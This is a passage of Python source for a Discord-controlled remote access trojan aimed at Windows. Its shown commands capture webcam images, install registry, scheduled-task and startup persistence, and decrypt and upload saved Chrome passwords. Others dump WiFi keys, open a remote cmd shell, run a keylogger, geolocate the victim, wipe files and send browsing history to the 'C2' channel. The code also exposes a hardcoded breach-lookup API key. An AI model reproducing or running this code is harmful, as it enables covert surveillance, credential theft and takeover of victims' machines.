webcam(ctx):\r\n    global created_channel\r\n\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Initialize the webcam capture\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n\r\n            if cap.isOpened():\r\n                # Capture a single frame from the webcam\r\n                ret, frame = cap.read()\r\n\r\n                if ret:\r\n                    # Save the captured image to a file\r\n                    image_path = 'webcam_image.png'\r\n                    cv2.imwrite(image_path, frame)\r\n\r\n                    # Upload the image to Discord\r\n                    await ctx.send(file=discord.File(image_path))\r\n\r\n                    # Remove the temporary image file\r\n                    os.remove(image_path)\r\n\r\n                else:\r\n                    await ctx.send(\"Failed to capture image from webcam.\")\r\n            else:\r\n                await ctx.send(\"Webcam not available.\")\r\n\r\n            # Release the webcam\r\n            cap.release()\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def version(ctx):\r\n    if ctx.channel == created_channel:    \r\n        print(\"Version is 1.9\")\r\n        await ctx.send(\"Current version is 1.9\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\n@bot.command()\r\nasync def SearchForPasswords(ctx, email):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            url = \"https://breachdirectory.p.rapidapi.com/\"\r\n\r\n            querystring = {f\"func\":\"password\",\"term\":\"{email}\"}\r\n\r\n            headers = {\r\n                \"X-RapidAPI-Key\": \"c8f932324emsha140e7ddc6cd6a8p1045a7jsnb5a89cca82b8\",\r\n                \"X-RapidAPI-Host\": \"breachdirectory.p.rapidapi.com\"\r\n            }\r\n\r\n            response = requests.get(url, headers=headers, params=querystring)\r\n\r\n            print(response.json())\r\n            await ctx.send(response.json())\r\n        except:\r\n            print(\"Something went wrong...\")\r\n            await ctx.send(\"Something went wrong...\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n@bot.command()\r\nasync def better_install(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!better_install\":\r\n        script_path = os.path.abspath(sys.argv[0])\r\n\r\n        try:\r\n            # Check the current persistence status\r\n            current_status = CheckBetterPersistence(script_path)\r\n\r\n            response = \"**Persistence Status:**\\n\"\r\n            response += f\"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\\n\"\r\n            response += f\"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\\n\"\r\n            response += f\"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\\n\\n\"\r\n\r\n            await ctx.send(response)\r\n\r\n            await ctx.send(\"\\n**Starting...**\\n\")\r\n            # Check and enable Registry Persistence if not already enabled\r\n            if not current_status['registry_persistence']:\r\n                try:\r\n                    await ctx.send(\"Starting Registry Persistence phase...\")\r\n                    registry_persistence(script_path)\r\n                    await ctx.send(\"Registry Persistence done!\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error starting registry persistence: {e}\")\r\n            else:\r\n                await ctx.send(\"Registry Persistence is already active.\")\r\n\r\n            # Check and enable Task Scheduler Persistence if not already enabled\r\n            if not current_status['task_scheduler_persistence']:\r\n                try:\r\n                    await ctx.send(\"Starting Task Scheduler Persistence phase...\")\r\n                    task_scheduler_persistence(script_path)\r\n                    await ctx.send(\"Task Scheduler Persistence done!\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error starting task scheduler persistence: {e}\")\r\n            else:\r\n                await ctx.send(\"Task Scheduler Persistence is already active.\")\r\n\r\n            # Check and enable Startup Persistence if not already enabled\r\n            if not current_status['startup_persistence']:\r\n                try:\r\n                    await ctx.send(\"Starting Startup Persistence phase...\")\r\n                    startup_persistence(script_path)\r\n                    await ctx.send(\"Startup Persistence done!\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error starting startup persistence: {e}\")\r\n            else:\r\n                await ctx.send(\"Startup Persistence is already active.\")\r\n            \r\n            await ctx.send(\"\\n**Done with all phases! \\nChecking status...**\\n\")\r\n\r\n            # Check the current persistence status\r\n            current_status = CheckBetterPersistence(script_path)\r\n\r\n            NewResponse = \"**New Persistence Status:**\\n\"\r\n            NewResponse += f\"Registry Persistence: {'Enabled' if current_status['registry_persistence'] else 'Not Enabled'}\\n\"\r\n            NewResponse += f\"Task Scheduler Persistence: {'Enabled' if current_status['task_scheduler_persistence'] else 'Not Enabled'}\\n\"\r\n            NewResponse += f\"Startup Persistence: {'Enabled' if current_status['startup_persistence'] else 'Not Enabled'}\\n\\n\"\r\n\r\n            await ctx.send(NewResponse)\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\ndef registry_persistence(script_path):\r\n    key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\r\n\r\n    # Copy the original script to C:\\Users\\Public\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n    shutil.copy(script_path, copied_script_path)\r\n\r\n    try:\r\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:\r\n            winreg.SetValueEx(registry_key, 'YourScriptName', 0, winreg.REG_SZ, str(copied_script_path))\r\n    except Exception as e:\r\n        print(f\"Error adding registry persistence: {e}\")\r\n\r\n    #os.system(f'start /MIN \"{copied_script_path}\"')\r\n\r\ndef task_scheduler_persistence(script_path):\r\n    # Automatically determine the username\r\n    username = os.getlogin()\r\n\r\n    # Define a list of possible paths to search for pythonw.exe\r\n    possible_paths = [\r\n        'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory\r\n        'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11\r\n    ]\r\n\r\n    # Find the first valid path to pythonw.exe\r\n    pythonw_path = None\r\n    for path in possible_paths:\r\n        if Path(path).is_file():\r\n            pythonw_path = path\r\n            break\r\n\r\n    if pythonw_path is None:\r\n        print(\"pythonw.exe not found. Please specify the correct path.\")\r\n        return\r\n\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n\r\n    # Copy the script to the public directory\r\n    shutil.copyfile(script_path, copied_script_path)\r\n\r\n    # Use os.system to create a scheduled task\r\n    task_name = 'YourTaskName'  # Change this to your desired task name\r\n    os.system(f\"SCHTASKS /Create /SC ONSTART /TN {task_name} /TR \\\"{path} {copied_script_path}\\\" /RU {username} /f\")\r\n\r\ndef startup_persistence(script_path):\r\n    # Automatically determine the username\r\n    username = os.getlogin()\r\n\r\n    # Define a list of possible paths to search for pythonw.exe\r\n    possible_paths = [\r\n        'C:/Python39/pythonw.exe',  # Default Python 3.11 installation directory\r\n        'C:/Python311/pythonw.exe',  # Default Python 3.9 installation directory\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python39/pythonw.exe',  # Microsoft Store 3.9\r\n        f'C:/Users/{username}/AppData/Local/Programs/Python/Python311/pythonw.exe',  # Microsoft Store 3.11\r\n    ]\r\n\r\n    # Find the first valid path to pythonw.exe\r\n    pythonw_path = None\r\n    for path in possible_paths:\r\n        if Path(path).is_file():\r\n            pythonw_path = path\r\n            break\r\n\r\n    if pythonw_path is None:\r\n        print(\"pythonw.exe not found. Please specify the correct path.\")\r\n        return\r\n    \r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n    shutil.copy(script_path, copied_script_path)\r\n    startup_folder = Path(os.path.expanduser(\"~\")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'\r\n    shortcut_path = startup_folder / 'YourScript.lnk'\r\n\r\n    with open('YourScript.bat', 'w') as batch_file:\r\n        batch_file.write(fr'''@echo off\r\n    start \"\" /B \"{path}\" \"{copied_script_path}\"\r\n    :: @echo off\r\n    :: start \"\" /B /MIN C:\\Users\\william.danielsson\\AppData\\Local\\Programs\\Python\\Python311\\pythonw.exe C:\\Users\\Public\\DiscordBOT.pyw\r\n    ''')\r\n\r\n    os.system('copy YourScript.bat \"{}\"'.format(startup_folder))\r\n    os.remove('YourScript.bat')\r\n\r\n\r\n# Checking of pre\r\ndef CheckBetterPersistence(script_path):\r\n    registry_persistence_exists = check_registry_persistence(script_path)\r\n    task_scheduler_persistence_exists = check_task_scheduler_persistence(script_path)\r\n    startup_persistence_exists = check_startup_persistence(script_path)\r\n\r\n    return {\r\n        \"registry_persistence\": registry_persistence_exists,\r\n        \"task_scheduler_persistence\": task_scheduler_persistence_exists,\r\n        \"startup_persistence\": startup_persistence_exists,\r\n    }\r\n\r\ndef check_registry_persistence(script_path):\r\n    # Add your code to check registry persistence here\r\n    key = r'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run'\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n\r\n    try:\r\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_READ) as registry_key:\r\n            value, _ = winreg.QueryValueEx(registry_key, 'YourScriptName')\r\n            return value == str(copied_script_path)\r\n    except Exception:\r\n        return False\r\n\r\ndef check_task_scheduler_persistence(script_path):\r\n    # Add your code to check task scheduler persistence here\r\n    task_name = 'YourTaskName'\r\n    result = os.system(f'schtasks /query /tn {task_name}')\r\n    return result == 0  # Task exists\r\n\r\ndef check_startup_persistence(script_path):\r\n    # Add your code to check startup folder persistence here\r\n    public_directory = Path('C:/Users/Public')\r\n    copied_script_path = public_directory / Path(script_path).name\r\n    startup_folder = Path(os.path.expanduser(\"~\")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'\r\n    shortcut_path = startup_folder / 'YourScript.bat'\r\n\r\n    return os.path.exists(str(shortcut_path))\r\n\r\n\r\n# Uninstall\r\n@bot.command()\r\nasync def better_uninstall(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!better_uninstall\":\r\n        script_path = os.path.abspath(sys.argv[0])\r\n\r\n        try:\r\n            # Check the current persistence status\r\n            current_status = CheckBetterPersistence(script_path)\r\n\r\n            if current_status['registry_persistence']:\r\n                try:\r\n                    await ctx.send(\"Disabling Registry Persistence...\")\r\n                    remove_registry_persistence()\r\n                    await ctx.send(\"Registry Persistence disabled.\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error disabling registry persistence: {e}\")\r\n\r\n            if current_status['task_scheduler_persistence']:\r\n                try:\r\n                    await ctx.send(\"Removing Task Scheduler Persistence...\")\r\n                    remove_task_scheduler_persistence()\r\n                    await ctx.send(\"Task Scheduler Persistence removed.\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error removing task scheduler persistence: {e}\")\r\n\r\n            if current_status['startup_persistence']:\r\n                try:\r\n                    await ctx.send(\"Disabling Startup Persistence...\")\r\n                    remove_startup_persistence()\r\n                    await ctx.send(\"Startup Persistence disabled.\")\r\n                except Exception as e:\r\n                    await ctx.send(f\"Error disabling startup persistence: {e}\")\r\n\r\n            await ctx.send(\"\\n**Done with uninstalling persistence!**\\n\")\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n# Add functions to remove persistence\r\ndef remove_registry_persistence():\r\n    key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\r\n\r\n    try:\r\n        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE) as registry_key:\r\n            winreg.DeleteValue(registry_key, 'YourScriptName')\r\n    except Exception as e:\r\n        print(f\"Error removing registry persistence: {e}\")\r\n\r\ndef remove_task_scheduler_persistence():\r\n    task_name = 'YourTaskName'  # Change this to the task name you used\r\n    os.system(f\"schtasks /delete /tn {task_name} /f\")\r\n\r\ndef remove_startup_persistence():\r\n    startup_folder = Path(os.path.expanduser(\"~\")) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'\r\n    shortcut_path = startup_folder / 'YourScript.bat'\r\n\r\n    if os.path.exists(str(shortcut_path)):\r\n        os.remove(str(shortcut_path))\r\n\r\n\r\n\r\nUSER_DATA_PATH, LOCAL_STATE_PATH = f\"{os.environ['USERPROFILE']}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\", f\"{os.environ['USERPROFILE']}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Local State\"\r\nTEMP_DB = f\"{os.environ['TEMP']}\\\\justforfun.db\"\r\n\r\n@bot.command()\r\nasync def passwords_chrome(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!passwords_chrome\":\r\n        await ctx.send(\"Grabbing passwords...\")\r\n        print(\"Chrome Password Decryptor by bytemafia\")\r\n        file_location = os.path.join(os.getcwd(), \"passwords.csv\") # Full file path\r\n        with open(file_location, mode='w', newline='') as passfile: # Write file\r\n            writer = csv.writer(passfile, delimiter=',')\r\n            writer.writerow([\"No      <->      URL      <->      Username      <->      Password\"])\r\n            secret_key = secretKey()\r\n            default_folders = (\"Profile\", \"Default\")\r\n            data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]\r\n            for data_folder in data_folders:\r\n                db_path = f\"{USER_DATA_PATH}\\\\{data_folder}\\\\Login Data\" # Chrome db\r\n                con = login_db(db_path)\r\n            if secret_key and con:\r\n                cur = con.cursor()\r\n                cur.execute(\"select action_url, username_value, password_value from logins\")\r\n                for index, data in enumerate(cur.fetchall()):\r\n                    url = data[0]\r\n                    username = data[1]\r\n                    ciphertext = data[2]\r\n                    if url != \"\" and username != \"\" and ciphertext != \"\": # To only collect valid entries\r\n                        password = password_decrypt(secret_key, ciphertext)\r\n                        writer.writerow([index, url, username, password])\r\n                print(\"Completed! File is at: \" + file_location)\r\n                con.close()\r\n                os.remove(TEMP_DB)\r\n                \r\n        # Uploading the file to the Discord server channel\r\n        with open(file_location, 'rb') as file:\r\n            file = discord.File(file)\r\n            await ctx.send(\"Here are the Chrome passwords:\", file=file)\r\n\r\n        # Remove the file after uploading\r\n        os.remove(file_location)\r\n\r\n# Collecting secret key\r\ndef secretKey():\r\n    try:\r\n        with open(LOCAL_STATE_PATH, \"r\") as f:\r\n            local_state = f.read()\r\n            key_text = json.loads(local_state)[\"os_crypt\"][\"encrypted_key\"]\r\n        key_buffer = base64.b64decode(key_text)[5:]\r\n        key = win32crypt.CryptUnprotectData(key_buffer)[1]\r\n        return key\r\n    except Exception as e:\r\n        print(e)\r\n\r\n# Login to db where creds are stored\r\ndef login_db(db_path):\r\n    try:\r\n        shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error\r\n        sql_connection = sqlite3.connect(TEMP_DB)\r\n        return sql_connection\r\n    except Exception as e:\r\n        print(e)\r\n\r\n# Decrypt the password\r\ndef password_decrypt(secret_key, ciphertext):\r\n    try:\r\n        iv = ciphertext[3:15]\r\n        password_hash = ciphertext[15:-16]\r\n        cipher = AES.new(secret_key, AES.MODE_GCM, iv)\r\n        password = cipher.decrypt(password_hash).decode()\r\n        return password\r\n    except Exception as e:\r\n        print(e)\r\n\r\n@bot.command()\r\nasync def interactive_cmd(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!interactive_cmd\":\r\n        # Check if the command was sent in a text channel and matches the command trigger\r\n        initial_directory = \"C:/Users\"  # Replace with your actual directory path\r\n        await ctx.send(f\"Interactive command prompt started in {initial_directory}. Type `exit` to exit.\")\r\n\r\n        # Start a subprocess for the command prompt\r\n        process = subprocess.Popen(\r\n            ['cmd'],\r\n            stdin=subprocess.PIPE,\r\n            stdout=subprocess.PIPE,\r\n            stderr=subprocess.PIPE,\r\n            shell=True,\r\n            cwd=initial_directory  # Set the initial directory\r\n        )\r\n\r\n        # Read and discard the initial copyright message\r\n        while True:\r\n            output_line = process.stdout.readline().decode('latin-1').strip()\r\n            if not output_line or output_line.endswith(initial_directory + \">\"):\r\n                break\r\n\r\n        async def read_output():\r\n            while True:\r\n                output_line = process.stdout.readline().decode('latin-1').strip()\r\n                if not output_line or output_line.endswith(initial_directory + \">\"):\r\n                    break\r\n                await ctx.send(f\"```\\n{output_line}\\n```\")\r\n\r\n        try:\r\n            while True:\r\n                user_input = await bot.wait_for('message', check=lambda message: message.channel == created_channel)\r\n                if user_input.content.lower() == 'exit':\r\n                    await ctx.send(\"Interactive command prompt ended.\")\r\n                    break\r\n\r\n                # Send user's input to the command prompt\r\n                process.stdin.write(f\"{user_input.content}\\n\".encode())\r\n                process.stdin.flush()\r\n\r\n                # Read the output of the previous command\r\n                await read_output()\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n        process.terminate()\r\n\r\n@bot.command()\r\nasync def geolocate(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!geolocate\":\r\n        await ctx.send(\"Calculating position...\")\r\n        gmaps = googlemaps.Client(GOOGLE_API_KEY)\r\n        loc = gmaps.geolocate()\r\n        latitude = loc['location']['lat']\r\n        longitude = loc['location']['lng']\r\n        accuracy_radius = loc['accuracy']  # Get the accuracy radius\r\n\r\n        google_maps_link = f\"https://maps.google.com/maps?q={latitude},{longitude}\"\r\n        await ctx.send(f\"Google Maps Link: {google_maps_link}\")\r\n        await ctx.send(f\"Accuracy Radius: {accuracy_radius} meters\")\r\n\r\n@bot.command()\r\nasync def messagebox(ctx, type, title, message):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            if not type or not title or not message:\r\n                await ctx.send(\"Please make sure you use the following syntax:\\n!messagebox [type] [title] [message]\")\r\n            else:\r\n                if type == \"error\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showerror(title, message)\r\n                    \r\n                elif type == \"info\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showinfo(title, message)\r\n                    \r\n                elif type == \"warning\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showwarning(title, message)\r\n                    \r\n        except Exception as e:\r\n            await ctx.send(f\"An error ocurred when showing messagebox:\\n{e}\")\r\n\r\n# Network stealer\r\n@bot.command()\r\nasync def network(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!network\":\r\n        await ctx.send(\"Loading WiFi SSIDs and passwords...\")\r\n        nameListString = \"\"\r\n        networkNames = subprocess.check_output(\"netsh wlan show profile\", shell=True, text=True)\r\n        networkNamesLines = networkNames.splitlines()\r\n        for line in networkNamesLines:\r\n            line.strip()\r\n            if ':' in line:\r\n                start = line.index(':') +1\r\n                name = str(line[start:].strip())\r\n                if len(name) > 1:\r\n                    try:\r\n                        checkInfo = f\"netsh wlan show profile name=\\\"{name}\\\" key=clear\"\r\n                        nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)\r\n                        nameInfo = nameInfo.splitlines()\r\n                    except subprocess.CalledProcessError:\r\n                        continue\r\n                    password = \"[!] Not Found!\"\r\n                    for i in nameInfo:\r\n                        if \"Key Content\" in i:\r\n                            start = i.index(\":\") +1\r\n                            password = i[start:].strip()\r\n                    nameListString += \"\\t\\t\" + name + \"\\t:\\t\" + password + \"\\n\"\r\n        await ctx.send(f\"**Saved Networks [NAME : PASSWORD]**:\\n\\n {nameListString}\")\r\n\r\ndef secure_delete_file(path_to_file):\r\n    # Securely delete a file by setting its data to zero.\r\n    CallME('fsutil.exe file setZeroData offset=0 length=9999999999 \"' + path_to_file + '\"')\r\n    os.remove(path_to_file)\r\n\r\n@bot.command()\r\nasync def securefile(ctx, path):\r\n    if ctx.channel == created_channel:\r\n        if not path:\r\n            await ctx.send(\"Please provide path to file (!securefile <path-to-file>).\")\r\n            return\r\n        try:\r\n            secure_delete_file(path)\r\n            await ctx.send(\"Successfully fucked file!\")\r\n            await ctx.message.add_reaction(\"\\U0001F4A5\")  # boom emoji\r\n        except FileNotFoundError as fnfe:\r\n            await ctx.send(\"The specified file was not found (\" + str(fnfe) + \")\")\r\n            return\r\n    \r\n\r\n# make a function that creates a reverse proxy\r\n\r\n\r\n# Create a function that creates a new chat with the same name as current chat\r\n# Everything sent to that chat will be executed using cmd\r\n@bot.command()\r\nasync def interactive(ctx):\r\n    if ctx.channel == created_channel:\r\n        # Get the name of the current chat\r\n        chat_name = ctx.channel.name\r\n\r\n        # Create a new chat with the same name as the current chat in the specified category\r\n        new_chat = await ctx.guild.create_text_channel(chat_name, category=categorieName)\r\n\r\n        # Send a message to the new chat\r\n        await new_chat.send(\"New chat created!\")\r\n\r\n        # Execute a command using cmd\r\n        command = \"ipconfig\"\r\n        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)\r\n\r\n        # Send the result of the command to the new chat\r\n        await new_chat.send(f\"```{result.stdout}```\")\r\n\r\n\r\n@bot.command()\r\nasync def sendkey(ctx, Key):\r\n    if ctx.channel == created_channel:\r\n        if not Key:\r\n            await ctx.send(\"Please provide keys to be pressed (!SendKey <Hello-World\\{ENTER\\}>).\")\r\n            return\r\n\r\n        await ctx.send(\"Creating .VBS script\")\r\n\r\n        # Change all \"-\" to \" \"\r\n        Key = Key.replace(\"-\", \" \")\r\n\r\n        # Create new .vbs script to send key\r\n        script_path = r'C:\\users\\public\\key.vbs'\r\n        with open(script_path, 'w') as f:\r\n            f.write('Set WshShell = WScript.CreateObject(\"WScript.Shell\")\\n')\r\n            f.write(f'WshShell.SendKeys \"{Key}\"\\n')\r\n\r\n        # Execute .vbs script\r\n        await ctx.send(\"Executing Script!\")\r\n        CallME(f'cscript \"{script_path}\"')\r\n\r\n        await ctx.send(\"Sent key: \" + Key)\r\n\r\n\r\n# Create a variable to store the logged keys\r\nlogged_keys = []\r\n\r\n# Define a global variable for the listener and is_logging\r\nlistener = None\r\nis_logging = False\r\n\r\n# Define keys that should trigger a new line\r\nnew_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])\r\n\r\ndef on_key_press(key):\r\n    global is_logging\r\n    if is_logging:\r\n        try:\r\n            # Check if the key is a modifier key and skip logging if it is\r\n            if isinstance(key, keyboard.KeyCode):\r\n                logged_key = key.char\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n        except AttributeError:\r\n            if key == keyboard.Key.space:\r\n                logged_key = \" \"\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n\r\ndef start_logging():\r\n    global listener, is_logging\r\n    logged_keys.clear()  # Clear previously logged keys\r\n    listener = keyboard.Listener(on_press=on_key_press)\r\n    listener.start()\r\n    is_logging = True\r\n    print(\"Logging started...\")\r\n\r\ndef stop_logging():\r\n    global listener, is_logging\r\n    if listener:\r\n        listener.stop()\r\n        with open(\"keylog.txt\", \"w\") as logfile:\r\n            logfile.write(\" \".join(logged_keys))\r\n        is_logging = False\r\n        print(\"Logging stopped. Keys saved to 'keylog.txt'\")\r\n\r\n@bot.command()\r\nasync def startlog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            await ctx.send(\"Logging is already started. Use **!dumplog** to see logs.\")\r\n        else:\r\n            start_logging()\r\n            await ctx.send(\"Logging started. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def stoplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            stop_logging()\r\n            await ctx.send(\"Logging stopped. Use **!dumplog** to see logs.\")\r\n        else:\r\n            await ctx.send(\"Logging is already stopped. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def dumplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global logged_keys\r\n        if logged_keys:\r\n            # Save the logged keys to a text file\r\n            with open(\"keylog.txt\", \"w\") as logfile:\r\n                logfile.write(\"\".join(logged_keys))\r\n\r\n            # Send the log file as an attachment\r\n            await ctx.send(\"Here is the log:\", file=discord.File(\"keylog.txt\"))\r\n\r\n            # Delete the temporary log file\r\n            os.remove(\"keylog.txt\")\r\n        else:\r\n            await ctx.send(\"No keys have been logged yet.\")\r\n\r\n@bot.command()\r\nasync def restart(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel:\r\n        \r\n        await ctx.send(\"Restarting...\")\r\n\r\n        # Determine the script filename dynamically\r\n        script_filename = sys.argv[0]\r\n\r\n        # Build the command to run the script with arguments\r\n        script_command = [sys.executable, script_filename]\r\n\r\n        # Start a new process to run the script\r\n        subprocess.Popen(script_command)\r\n\r\n        # Delete channel\r\n        if created_channel:\r\n            await created_channel.delete()\r\n\r\n        # Exit the current script\r\n        sys.exit()\r\n\r\n\r\ndef installNirsoft(zip_file_url, exe_file_name):\r\n    # Destination path for the downloaded .zip file\r\n    zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n    # Directory where you want to extract the .exe file\r\n    extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n    \r\n    # Check if the .zip file already exists, and if not, download it\r\n    if not os.path.exists(zip_download_path):\r\n        try:\r\n            # Download the .zip file\r\n            response = requests.get(zip_file_url)\r\n            with open(zip_download_path, 'wb') as file:\r\n                file.write(response.content)\r\n            print(f\".zip File downloaded to {zip_download_path}\")\r\n        except Exception as e:\r\n            print(f\".zip File download failed: {str(e)}\")\r\n\r\n    # Extract the .exe file from the .zip archive\r\n    try:\r\n        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n            # Check if the .exe file exists in the archive\r\n            if exe_file_name in zip_ref.namelist():\r\n                zip_ref.extract(exe_file_name, extraction_directory)\r\n                exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                print(f\".exe File extracted to {exe_path}\")\r\n            else:\r\n                print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n    except Exception as e:\r\n        print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\ndef program_isInstalled(full_path_to_exe):\r\n    return os.path.exists(full_path_to_exe)\r\n\r\n\r\n@bot.command()\r\nasync def history(ctx):\r\n    if ctx.channel == created_channel:\r\n        # URL of the .zip file to download\r\n        zip_file_url = \"https://www.nirsoft.net/utils/browsinghistoryview.zip\"\r\n\r\n        # Destination path for the downloaded .zip file\r\n        zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n        # Directory where you want to extract the .exe file\r\n        extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n\r\n        # Command to execute after extracting the .exe file\r\n        command_to_execute = r'BrowsingHistoryView.exe /HistorySource 1 /LoadChrome 1 /shtml \"C:\\Users\\Public\\history.html\"'\r\n\r\n        # Check if the .zip file already exists, and if not, download it\r\n        if not os.path.exists(zip_download_path):\r\n            try:\r\n                # Download the .zip file\r\n                response = requests.get(zip_file_url)\r\n                with open(zip_download_path, 'wb') as file:\r\n                    file.write(response.content)\r\n                await ctx.send(f\".zip File downloaded to {zip_download_path}\")\r\n                print(f\".zip File downloaded to {zip_download_path}\")\r\n            except Exception as e:\r\n                await ctx.send(f\".zip File download failed: {str(e)}\")\r\n                print(f\".zip File download failed: {str(e)}\")\r\n\r\n        # Extract the .exe file from the .zip archive\r\n        try:\r\n            with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n                # Specify the name of the .exe file you want to extract\r\n                exe_file_name = \"BrowsingHistoryView.exe\"\r\n\r\n                # Check if the .exe file exists in the archive\r\n                if exe_file_name in zip_ref.namelist():\r\n                    zip_ref.extract(exe_file_name, extraction_directory)\r\n                    exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                    await ctx.send(f\".exe File extracted to {exe_path}\")\r\n                    print(f\".exe File extracted to {exe_path}\")\r\n                else:\r\n                    await ctx.send(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n                    print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n        except Exception as e:\r\n            await ctx.send(f\"Extraction of .exe file failed: {str(e)}\")\r\n            print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\n        # Execute the command using the extracted .exe file\r\n        try:\r\n            subprocess.run(command_to_execute, shell=True, cwd=extraction_directory)\r\n            success_message = \"Command executed successfully.\"\r\n            print(success_message)\r\n            await ctx.send(success_message)\r\n\r\n            # Send file to C2\r\n            await ctx.send(\"Sent file to C2\", file=discord.File(extraction_directory + \"\\history.html\"))\r\n\r\n            # Delete the archive (.zip) and the extracted .exe file\r\n            os.remove(extraction_directory + \"\\\\history.html\")\r\n            os.remove(zip_download_path)\r\n            os.remove(exe_path)\r\n            print(f\".zip, .html and .exe files deleted.\")\r\n            await ctx.send(f\".zip, .html and .exe files deleted.\")\r\n        except Exception as e:\r\n            error_message = f\"Command execution failed: {str(e)}\"\r\n            print(error_message)\r\n            await ctx.send(\"Error: \" + error_message)\r\n\r\n@bot.command()\r\nasync def volume(ctx, volume_amount):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            if program_isInstalled(\"C:\\\\Users\\\\Public\\\\nircmd.exe\"):\r\n                await ctx.send(f\"NirCMD is installed and ready!\")\r\n\r\n                volume_amount = int(volume_amount)\r\n\r\n                if 0 <= volume_amount <= 100:\r\n                    # Calculate from procentage to NirCMD volume (1% being 655)\r\n                    volume_level = 